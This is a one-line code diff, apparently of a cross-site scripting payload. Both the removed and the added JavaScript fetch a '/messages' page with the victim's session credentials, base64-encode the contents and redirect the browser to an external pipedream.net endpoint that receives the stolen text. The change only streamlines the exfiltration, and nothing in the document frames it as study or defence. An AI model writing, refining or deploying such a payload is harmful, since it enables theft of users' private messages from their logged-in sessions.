@@ -1,1 +1,1 @@
-(async()=>{let t='';try{t=await (await fetch('/messages',{credentials:'include'})).text()}catch(e){t='err:'+e}setTimeout(()=>{top.location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)},300)})();
+(async()=>{let t=await (await fetch(new Request('/messages',{credentials:'include',mode:'same-origin',cache:'no-store'}))).text();window.location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)})();
